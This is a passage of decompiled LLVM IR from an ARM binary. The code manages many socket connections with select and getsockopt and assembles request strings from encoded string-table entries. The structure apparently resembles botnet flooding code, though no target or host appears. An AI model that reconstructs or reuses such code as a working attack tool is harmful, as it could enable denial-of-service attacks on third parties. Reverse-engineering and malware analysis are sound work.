  %v1_94ac = urem i32 %v1_94b4, 32
  store i32 %v1_94ac, i32* %r1.global-to-local, align 4
  %v1_94b0 = load i32, i32* %fp.global-to-local, align 4
  %v7_94b0 = shl i32 %v1_94b0, %v1_94ac
  %v8_94b0 = or i32 %v7_94b0, %v3_94a8
  store i32 %v8_94b0, i32* %r2.global-to-local, align 4
  %v0_94b4 = load i32, i32* @sl, align 4
  %v2_94b4 = sub i32 %v0_94b4, %v1_94b4
  %v3_94b4 = icmp uge i32 %v0_94b4, %v1_94b4
  store i1 %v3_94b4, i1* %cpsr_c.global-to-local, align 1
  %v4_94b4 = xor i32 %v0_94b4, %v1_94b4
  %v5_94b4 = xor i32 %v2_94b4, %v0_94b4
  %v6_94b4 = and i32 %v5_94b4, %v4_94b4
  %v7_94b4 = icmp slt i32 %v6_94b4, 0
  store i1 %v7_94b4, i1* %cpsr_v.global-to-local, align 1
  %v8_94b4 = icmp slt i32 %v2_94b4, 0
  store i1 %v8_94b4, i1* %cpsr_n.global-to-local, align 1
  %v9_94b4 = icmp eq i32 %v0_94b4, %v1_94b4
  store i1 %v9_94b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_94b0, i32* %v2_94a8, align 4
  %v2_94bc = xor i1 %v8_94b4, %v7_94b4
  br i1 %v2_94bc, label %dec_label_pc_94c0, label %dec_label_pc_9388

dec_label_pc_94c0:                                ; preds = %dec_label_pc_94a8
  %v0_94c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_94c0 = add i32 %v0_94c0, 1
  store i32 %v1_94c0, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_94c4:                                ; preds = %dec_label_pc_9ab8, %dec_label_pc_9a80, %dec_label_pc_94c0
  %v0_94e498 = phi i32 [ %v1_9ab8, %dec_label_pc_9ab8 ], [ %v1_9a80, %dec_label_pc_9a80 ], [ %v1_94c0, %dec_label_pc_94c0 ]
  store i32 %v0_90f4, i32* %lr.global-to-local, align 4
  %v0_94c8 = load i32, i32* @r8, align 4
  %v1_94c8 = add i32 %v0_94c8, 1
  store i32 %v1_94c8, i32* @r8, align 4
  %v0_94cc = load i32, i32* @r7, align 4
  %v0_94d0 = load i32, i32* @r6, align 4
  %v2_94d4 = sub i32 %v0_90f4, %v1_94c8
  %v3_94d4 = icmp uge i32 %v0_90f4, %v1_94c8
  store i1 %v3_94d4, i1* %cpsr_c.global-to-local, align 1
  %v4_94d4 = xor i32 %v1_94c8, %v0_90f4
  %v5_94d4 = xor i32 %v2_94d4, %v0_90f4
  %v6_94d4 = and i32 %v5_94d4, %v4_94d4
  %v7_94d4 = icmp slt i32 %v6_94d4, 0
  store i1 %v7_94d4, i1* %cpsr_v.global-to-local, align 1
  %v8_94d4 = icmp slt i32 %v2_94d4, 0
  store i1 %v8_94d4, i1* %cpsr_n.global-to-local, align 1
  %v9_94d4 = icmp eq i32 %v0_90f4, %v1_94c8
  store i1 %v9_94d4, i1* %cpsr_z.global-to-local, align 1
  %v1_94d8 = add i32 %v0_94cc, 3140
  store i32 %v1_94d8, i32* @r7, align 4
  %v1_94dc = add i32 %v0_94d0, 3140
  store i32 %v1_94dc, i32* @r6, align 4
  br i1 %v9_94d4, label %dec_label_pc_94e4, label %dec_label_pc_93a8

dec_label_pc_94e4:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge
  %v0_951c = phi i32 [ %v0_94e4.pre, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge ], [ %v0_94e498, %dec_label_pc_94c4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94e4 = icmp slt i32 %v0_951c, 0
  store i1 %v1_94e4, i1* %cpsr_n.global-to-local, align 1
  %v2_94e4 = icmp eq i32 %v0_951c, 0
  store i1 %v2_94e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94e4, label %dec_label_pc_9280, label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94e4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 %v2_950c, i32* %ip.global-to-local, align 4
  store i32 %v2_9510, i32* %r1.global-to-local, align 4
  store i32 %v2_9514, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_951c, i32* %r0.global-to-local, align 4
  %v5_9524 = call i32 @_select(i32 %v0_951c, i32 %v2_9510, i32 %v2_9514, i32 0, i32 %v2_950c)
  store i32 %v5_9524, i32* @r4, align 4
  %v0_952c = load i32, i32* @r5, align 4
  store i32 %v0_952c, i32* %r0.global-to-local, align 4
  %v1_9530 = inttoptr i32 %v0_952c to i32*
  %v2_9530 = call i32 @time(i32* %v1_9530)
  store i32 %v2_9530, i32* %r0.global-to-local, align 4
  %v0_9534 = load i32, i32* @r4, align 4
  %v1_9534 = load i32, i32* @r5, align 4
  %v2_9534 = sub i32 %v0_9534, %v1_9534
  %v3_9534 = icmp uge i32 %v0_9534, %v1_9534
  store i1 %v3_9534, i1* %cpsr_c.global-to-local, align 1
  %v4_9534 = xor i32 %v1_9534, %v0_9534
  %v5_9534 = xor i32 %v2_9534, %v0_9534
  %v6_9534 = and i32 %v5_9534, %v4_9534
  %v7_9534 = icmp slt i32 %v6_9534, 0
  store i1 %v7_9534, i1* %cpsr_v.global-to-local, align 1
  %v8_9534 = icmp slt i32 %v2_9534, 0
  store i1 %v8_9534, i1* %cpsr_n.global-to-local, align 1
  %v9_9534 = icmp eq i32 %v0_9534, %v1_9534
  store i1 %v9_9534, i1* %cpsr_z.global-to-local, align 1
  %v7_953c = icmp sgt i32 %v0_9534, %v1_9534
  br i1 %v7_953c, label %dec_label_pc_9540, label %dec_label_pc_9280

dec_label_pc_9540:                                ; preds = %dec_label_pc_94ec
  store i32 %stack_var_-20868.0.ph, i32* @r8, align 4
  br label %dec_label_pc_95b0

dec_label_pc_954c:                                ; preds = %.thread38.dec_label_pc_954c_crit_edge, %dec_label_pc_95c0
  %v0_9564 = phi i32 [ %v0_954c.pre, %.thread38.dec_label_pc_954c_crit_edge ], [ %v3_95b0, %dec_label_pc_95c0 ]
  %v3_954c = udiv i32 %v0_9564, 32
  store i32 %v2_94a0, i32* %r2.global-to-local, align 4
  %v3_9558 = mul nuw nsw i32 %v3_954c, 4
  %v2_955c = add i32 %v3_9558, %v2_94a0
  store i32 %v2_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_955c, -164
  %v2_9560 = inttoptr i32 %v1_9560 to i32*
  %v3_9560 = load i32, i32* %v2_9560, align 4
  %v1_9564 = urem i32 %v0_9564, 32
  store i32 %v1_9564, i32* %r1.global-to-local, align 4
  %v2_9568 = add nsw i32 %v1_9564, -1
  %v3_9568 = shl i32 1, %v2_9568
  %v4_9568 = and i32 %v3_9568, %v3_9560
  %v5_9568 = icmp ne i32 %v4_9568, 0
  store i1 %v5_9568, i1* %cpsr_c.global-to-local, align 1
  %v6_9568 = lshr i32 %v3_9560, %v1_9564
  store i32 %v6_9568, i32* %r2.global-to-local, align 4
  %v1_956c = urem i32 %v6_9568, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_956c = icmp eq i32 %v1_956c, 0
  store i1 %v2_956c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_956c, label %dec_label_pc_9590, label %dec_label_pc_9574

dec_label_pc_9574:                                ; preds = %dec_label_pc_954c
  %v0_9574 = load i32, i32* @r8, align 4
  %v1_9574 = add i32 %v0_9574, -1452
  %v2_9574 = inttoptr i32 %v1_9574 to i8*
  %v3_9574 = load i8, i8* %v2_9574, align 1
  %v4_9574 = zext i8 %v3_9574 to i32
  store i32 %v4_9574, i32* %r3.global-to-local, align 4
  %v2_9578 = icmp ugt i8 %v3_9574, 5
  store i1 %v2_9578, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9578 = icmp ult i8 %v3_9574, 6
  store i1 %v6_9578, i1* %cpsr_n.global-to-local, align 1
  %v7_9578 = icmp eq i8 %v3_9574, 6
  store i1 %v7_9578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9578, label %dec_label_pc_9b28, label %dec_label_pc_9580

dec_label_pc_9580:                                ; preds = %dec_label_pc_9574
  %v2_9580 = icmp ugt i8 %v3_9574, 6
  store i1 %v2_9580, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9580 = icmp ult i8 %v3_9574, 7
  store i1 %v6_9580, i1* %cpsr_n.global-to-local, align 1
  %v7_9580 = icmp eq i8 %v3_9574, 7
  store i1 %v7_9580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9580, label %dec_label_pc_a164, label %dec_label_pc_9588

dec_label_pc_9588:                                ; preds = %dec_label_pc_9580
  %v2_9588 = icmp ugt i8 %v3_9574, 9
  store i1 %v2_9588, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9588 = icmp ult i8 %v3_9574, 10
  store i1 %v6_9588, i1* %cpsr_n.global-to-local, align 1
  %v7_9588 = icmp eq i8 %v3_9574, 10
  store i1 %v7_9588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9588, label %dec_label_pc_a374, label %dec_label_pc_9590

dec_label_pc_9590:                                ; preds = %dec_label_pc_a268, %dec_label_pc_a6a8, %dec_label_pc_a7f0, %dec_label_pc_a66c, %dec_label_pc_9588, %dec_label_pc_954c, %dec_label_pc_95b0, %dec_label_pc_aadc, %dec_label_pc_a88c, %dec_label_pc_a7d4, %dec_label_pc_a68c, %dec_label_pc_a654, %dec_label_pc_a5dc, %dec_label_pc_a3b4, %dec_label_pc_9634, %dec_label_pc_a158
  store i32 %v0_90f4, i32* %r3.global-to-local, align 4
  %v1_9598 = add i32 %stack_var_-20832.0, 1
  store i32 %v1_9598, i32* %r2.global-to-local, align 4
  %v0_959c = load i32, i32* @r8, align 4
  %v2_95a0 = sub i32 %v1_9598, %v0_90f4
  %v3_95a0 = icmp uge i32 %v1_9598, %v0_90f4
  store i1 %v3_95a0, i1* %cpsr_c.global-to-local, align 1
  %v4_95a0 = xor i32 %v1_9598, %v0_90f4
  %v5_95a0 = xor i32 %v2_95a0, %v1_9598
  %v6_95a0 = and i32 %v5_95a0, %v4_95a0
  %v7_95a0 = icmp slt i32 %v6_95a0, 0
  store i1 %v7_95a0, i1* %cpsr_v.global-to-local, align 1
  %v8_95a0 = icmp slt i32 %v2_95a0, 0
  store i1 %v8_95a0, i1* %cpsr_n.global-to-local, align 1
  %v9_95a0 = icmp eq i32 %v1_9598, %v0_90f4
  store i1 %v9_95a0, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = add i32 %v0_959c, 3140
  store i32 %v1_95a8, i32* @r8, align 4
  br i1 %v9_95a0, label %dec_label_pc_9280, label %dec_label_pc_95b0

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9590, %dec_label_pc_9540
  %v0_95b8 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_9540 ], [ %v1_95a8, %dec_label_pc_9590 ]
  %stack_var_-20832.0 = phi i32 [ %v1_9534, %dec_label_pc_9540 ], [ %v1_9598, %dec_label_pc_9590 ]
  %v1_95b0 = add i32 %v0_95b8, -1456
  %v2_95b0 = inttoptr i32 %v1_95b0 to i32*
  %v3_95b0 = load i32, i32* %v2_95b0, align 4
  store i32 %v3_95b0, i32* %r0.global-to-local, align 4
  %v1_95b4 = add i32 %v3_95b0, 1
  %v2_95b4 = icmp eq i32 %v3_95b0, -1
  store i1 %v2_95b4, i1* %cpsr_c.global-to-local, align 1
  %v3_95b4 = sub i32 0, %v3_95b0
  %v4_95b4 = and i32 %v1_95b4, %v3_95b4
  %v5_95b4 = icmp slt i32 %v4_95b4, 0
  store i1 %v5_95b4, i1* %cpsr_v.global-to-local, align 1
  %v6_95b4 = icmp slt i32 %v1_95b4, 0
  store i1 %v6_95b4, i1* %cpsr_n.global-to-local, align 1
  %v7_95b4 = icmp eq i32 %v1_95b4, 0
  store i1 %v7_95b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_95b0, i32* %sb.global-to-local, align 4
  br i1 %v7_95b4, label %dec_label_pc_9590, label %dec_label_pc_95c0

dec_label_pc_95c0:                                ; preds = %dec_label_pc_95b0
  %v3_95c0 = udiv i32 %v3_95b0, 32
  %v3_95c8 = mul nuw nsw i32 %v3_95c0, 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_95d0 = add i32 %v3_95c8, %v2_94a0
  store i32 %v2_95d0, i32* %r3.global-to-local, align 4
  %v1_95d4 = add i32 %v2_95d0, -292
  %v2_95d4 = inttoptr i32 %v1_95d4 to i32*
  %v3_95d4 = load i32, i32* %v2_95d4, align 4
  %v1_95d8 = urem i32 %v3_95b0, 32
  store i32 %v1_95d8, i32* %r1.global-to-local, align 4
  %v2_95dc = add nsw i32 %v1_95d8, -1
  %v3_95dc = shl i32 1, %v2_95dc
  %v4_95dc = and i32 %v3_95d4, %v3_95dc
  %v5_95dc = icmp ne i32 %v4_95dc, 0
  store i1 %v5_95dc, i1* %cpsr_c.global-to-local, align 1
  %v6_95dc = lshr i32 %v3_95d4, %v1_95d8
  store i32 %v6_95dc, i32* %r2.global-to-local, align 4
  %v1_95e0 = urem i32 %v6_95dc, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_95e0 = icmp eq i32 %v1_95e0, 0
  store i1 %v2_95e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95e0, label %dec_label_pc_954c, label %dec_label_pc_95e8

dec_label_pc_95e8:                                ; preds = %dec_label_pc_95c0
  store i32 4, i32* @r4, align 4
  store i32 %v10_9048, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_9600, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 4, i32* %stack_var_-48, align 4
  store i32 %v2_960c, i32* %lr.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v7_9618 = call i32 @getsockopt(i32 %v3_95b0, i32 1, i32 4, i32* nonnull %stack_var_-44, i32* nonnull %stack_var_-48)
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9620 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9620, i32* %r3.global-to-local, align 4
  %v2_9624 = or i32 %v3_9620, %v7_9618
  store i32 %v2_9624, i32* %r0.global-to-local, align 4
  %v3_9624 = icmp slt i32 %v2_9624, 0
  store i1 %v3_9624, i1* %cpsr_n.global-to-local, align 1
  %v4_9624 = icmp eq i32 %v2_9624, 0
  store i1 %v4_9624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_9624, label %.thread38, label %dec_label_pc_9634

.thread38:                                        ; preds = %dec_label_pc_95e8
  %v1_9628 = load i32, i32* @r8, align 4
  %v2_9628 = add i32 %v1_9628, -1456
  %v3_9628 = inttoptr i32 %v2_9628 to i32*
  %v4_9628 = load i32, i32* %v3_9628, align 4
  store i32 %v4_9628, i32* %r0.global-to-local, align 4
  %v1_962c = load i32, i32* @r4, align 4
  %v2_962c = trunc i32 %v1_962c to i8
  %v4_962c = add i32 %v1_9628, -1452
  %v5_962c = inttoptr i32 %v4_962c to i8*
  store i8 %v2_962c, i8* %v5_962c, align 1
  %v0_9630.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9630.pr.pr, label %.thread38.dec_label_pc_954c_crit_edge, label %dec_label_pc_9634

.thread38.dec_label_pc_954c_crit_edge:            ; preds = %.thread38
  %v0_954c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_954c

dec_label_pc_9634:                                ; preds = %dec_label_pc_95e8, %.thread38
  %v0_9634 = load i32, i32* @r8, align 4
  %v1_9634 = add i32 %v0_9634, -1456
  %v2_9634 = inttoptr i32 %v1_9634 to i32*
  %v3_9634 = load i32, i32* %v2_9634, align 4
  store i32 %v3_9634, i32* %r0.global-to-local, align 4
  %v1_9638 = call i32 @close(i32 %v3_9634)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_9640 = load i32, i32* @r8, align 4
  %v2_9640 = add i32 %v1_9640, -1456
  %v3_9640 = inttoptr i32 %v2_9640 to i32*
  store i32 -1, i32* %v3_9640, align 4
  %v0_9644 = load i32, i32* @r5, align 4
  %v1_9644 = trunc i32 %v0_9644 to i8
  %v2_9644 = load i32, i32* @r8, align 4
  %v3_9644 = add i32 %v2_9644, -1452
  %v4_9644 = inttoptr i32 %v3_9644 to i8*
  store i8 %v1_9644, i8* %v4_9644, align 1
  br label %dec_label_pc_9590

dec_label_pc_964c:                                ; preds = %dec_label_pc_93a8
  %v1_964c = add i32 %v3_9658, 25
  %v2_964c = inttoptr i32 %v1_964c to i32*
  %v3_964c = load i32, i32* %v2_964c, align 4
  store i32 %v3_964c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9650 = icmp slt i32 %v3_964c, 0
  store i1 %v1_9650, i1* %cpsr_n.global-to-local, align 1
  %v2_9650 = icmp eq i32 %v3_964c, 0
  store i1 %v2_9650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9650, label %.thread43, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_964c
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_93a8, align 1
  %v0_965c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_965c.pr.pr, label %.thread41..thread43_crit_edge, label %dec_label_pc_9664

.thread41..thread43_crit_edge:                    ; preds = %.thread41
  %v1_965c.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_965c.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_965c.pre to i8
  br label %.thread43

.thread43:                                        ; preds = %.thread41..thread43_crit_edge, %dec_label_pc_964c
  %v3_965c = phi i32 [ %v3_965c.pre, %.thread41..thread43_crit_edge ], [ %v3_9658, %dec_label_pc_964c ]
  %v1_965c.off0 = phi i8 [ %extract.t, %.thread41..thread43_crit_edge ], [ 0, %dec_label_pc_964c ]
  %v4_965c = add i32 %v3_965c, -1427
  %v5_965c = inttoptr i32 %v4_965c to i8*
  store i8 %v1_965c.off0, i8* %v5_965c, align 1
  %v0_9660.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9660.pr, label %.thread43.dec_label_pc_93bc_crit_edge, label %dec_label_pc_9664

.thread43.dec_label_pc_93bc_crit_edge:            ; preds = %.thread43
  %v0_93bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_93bc

dec_label_pc_9664:                                ; preds = %.thread41, %.thread43, %dec_label_pc_9318
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_966c = load i32, i32* @r7, align 4
  %v1_966c = add i32 %v0_966c, 2112
  store i32 %v1_966c, i32* %r0.global-to-local, align 4
  %v1_9670 = load i32, i32* @r6, align 4
  %v2_9670 = add i32 %v1_9670, 33
  %v3_9670 = inttoptr i32 %v2_9670 to i32*
  store i32 -1, i32* %v3_9670, align 4
  %v0_9674 = load i32, i32* %r0.global-to-local, align 4
  %v1_9674 = add i32 %v0_9674, 4
  store i32 %v1_9674, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_967c = load i32, i32* @r5, align 4
  %v1_967c = load i32, i32* @r6, align 4
  %v2_967c = add i32 %v1_967c, 21
  %v3_967c = inttoptr i32 %v2_967c to i32*
  store i32 %v0_967c, i32* %v3_967c, align 4
  %v2_9680 = call i32 @function_13af4(i32 %v1_9674, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_968c = load i32, i32* @r5, align 4
  %v1_968c = load i32, i32* @r6, align 4
  %v2_968c = add i32 %v1_968c, 681
  %v3_968c = inttoptr i32 %v2_968c to i32*
  store i32 %v0_968c, i32* %v3_968c, align 4
  %v2_9690 = call i32 @function_13af4(i32 %stack_var_-20856.0.ph, i32 10240)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9698 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  %v0_96a0 = load i32, i32* @r6, align 4
  store i32 %v0_96a0, i32* %r1.global-to-local, align 4
  %v2_96a4 = add i32 %v2_9698, %stack_var_-20856.0.ph
  store i32 %v2_96a4, i32* @r0, align 4
  %v2_96a8 = inttoptr i32 %v2_96a4 to i8*
  %v3_96a8 = call i32 @function_13a7c(i8* %v2_96a8, i32 %v0_96a0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96b0 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143ac.83 to i32), i32* %r1.global-to-local, align 4
  %v2_96bc = add i32 %v2_96b0, %stack_var_-20856.0.ph
  store i32 %v2_96bc, i32* @r0, align 4
  %v2_96c0 = inttoptr i32 %v2_96bc to i8*
  %v3_96c0 = call i32 @function_13a7c(i8* %v2_96c0, i32 ptrtoint (i32* @global_var_143ac.83 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96c8 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  %v0_96d0 = load i32, i32* @r7, align 4
  %v1_96d0 = add i32 %v0_96d0, 532
  store i32 %v1_96d0, i32* %r1.global-to-local, align 4
  %v2_96d4 = add i32 %v2_96c8, %stack_var_-20856.0.ph
  store i32 %v2_96d4, i32* @r0, align 4
  %v2_96d8 = inttoptr i32 %v2_96d4 to i8*
  %v3_96d8 = call i32 @function_13a7c(i8* %v2_96d8, i32 %v1_96d0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96e0 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_14384.85 to i32), i32* %r1.global-to-local, align 4
  %v2_96ec = add i32 %v2_96e0, %stack_var_-20856.0.ph
  store i32 %v2_96ec, i32* @r0, align 4
  %v3_96f0 = inttoptr i32 %v2_96ec to i8*
  %v4_96f0 = call i32 @function_13a7c(i8* %v3_96f0, i32 ptrtoint ([24 x i8]* @global_var_14384.85 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96f8 = call i32 @function_13a54(i8* %v1_9698)
  %v2_9700 = add i32 %v2_96f8, %stack_var_-20856.0.ph
  store i32 %v2_9700, i32* @r0, align 4
  %v0_9704 = load i32, i32* @r7, align 4
  %v1_9704 = add i32 %v0_9704, 20
  store i32 %v1_9704, i32* %r1.global-to-local, align 4
  %v2_9708 = inttoptr i32 %v2_9700 to i8*
  %v3_9708 = call i32 @function_13a7c(i8* %v2_9708, i32 %v1_9704)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9710 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1439c.87 to i32), i32* %r1.global-to-local, align 4
  %v2_971c = add i32 %v2_9710, %stack_var_-20856.0.ph
  store i32 %v2_971c, i32* @r0, align 4
  %v3_9720 = inttoptr i32 %v2_971c to i8*
  %v4_9720 = call i32 @function_13a7c(i8* %v3_9720, i32 ptrtoint ([9 x i8]* @global_var_1439c.87 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9728 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v0_9730 = load i32, i32* @r7, align 4
  %v2_9734 = add i32 %v2_9728, %stack_var_-20856.0.ph
  store i32 %v2_9734, i32* @r0, align 4
  %v1_9738 = add i32 %v0_9730, 789
  store i32 %v1_9738, i32* %r1.global-to-local, align 4
  %v2_973c = inttoptr i32 %v2_9734 to i8*
  %v3_973c = call i32 @function_13a7c(i8* %v2_973c, i32 %v1_9738)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9744 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  %v2_9750 = add i32 %v2_9744, %stack_var_-20856.0.ph
  store i32 %v2_9750, i32* @r0, align 4
  %v3_9754 = inttoptr i32 %v2_9750 to i8*
  %v4_9754 = call i32 @function_13a7c(i8* %v3_9754, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_975c = call i32 @function_13128(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9764 = call i32 @function_13a54(i8* %v1_9698)
  %v0_9768 = load i32, i32* @r5, align 4
  store i32 %v0_9768, i32* %r1.global-to-local, align 4
  store i32 %v2_9764, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_9774 = inttoptr i32 %v0_9768 to i32*
  %v3_9774 = call i32 @function_13044(i32 32, i32* %v2_9774)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 %v3_9774, i32* %r1.global-to-local, align 4
  %v1_9780 = load i32, i32* @r4, align 4
  %v2_9780 = add i32 %v1_9780, %stack_var_-20856.0.ph
  store i32 %v2_9780, i32* @r0, align 4
  %v2_9784 = inttoptr i32 %v2_9780 to i8*
  %v3_9784 = call i32 @function_13a7c(i8* %v2_9784, i32 %v3_9774)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_978c = call i32 @function_13070(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9794 = call i32 @function_13a54(i8* %v1_9698)
  %v2_979c = add i32 %v2_9794, %stack_var_-20856.0.ph
  store i32 %v2_979c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  %v3_97a4 = inttoptr i32 %v2_979c to i8*
  %v4_97a4 = call i32 @function_13a7c(i8* %v3_97a4, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_97ac = call i32 @function_13128(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97b4 = call i32 @function_13a54(i8* %v1_9698)
  %v0_97b8 = load i32, i32* @r5, align 4
  store i32 %v0_97b8, i32* %r1.global-to-local, align 4
  store i32 %v2_97b4, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_97c4 = inttoptr i32 %v0_97b8 to i32*
  %v3_97c4 = call i32 @function_13044(i32 33, i32* %v2_97c4)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_97c4, i32* %r1.global-to-local, align 4
  %v1_97d0 = load i32, i32* @r4, align 4
  %v2_97d0 = add i32 %v1_97d0, %stack_var_-20856.0.ph
  store i32 %v2_97d0, i32* @r0, align 4
  %v2_97d4 = inttoptr i32 %v2_97d0 to i8*
  %v3_97d4 = call i32 @function_13a7c(i8* %v2_97d4, i32 %v3_97c4)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_97dc = call i32 @function_13070(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97e4 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  %v2_97f0 = add i32 %v2_97e4, %stack_var_-20856.0.ph
  store i32 %v2_97f0, i32* @r0, align 4
  %v3_97f4 = inttoptr i32 %v2_97f0 to i8*
  %v4_97f4 = call i32 @function_13a7c(i8* %v3_97f4, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_97fc = call i32 @function_13128(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9804 = call i32 @function_13a54(i8* %v1_9698)
  %v0_9808 = load i32, i32* @r5, align 4
  store i32 %v0_9808, i32* %r1.global-to-local, align 4
  store i32 %v2_9804, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_9814 = inttoptr i32 %v0_9808 to i32*
  %v3_9814 = call i32 @function_13044(i32 34, i32* %v2_9814)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_9814, i32* %r1.global-to-local, align 4
  %v1_9820 = load i32, i32* @r4, align 4
  %v2_9820 = add i32 %v1_9820, %stack_var_-20856.0.ph
  store i32 %v2_9820, i32* @r0, align 4
  %v2_9824 = inttoptr i32 %v2_9820 to i8*
  %v3_9824 = call i32 @function_13a7c(i8* %v2_9824, i32 %v3_9814)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_982c = call i32 @function_13070(i32 34)
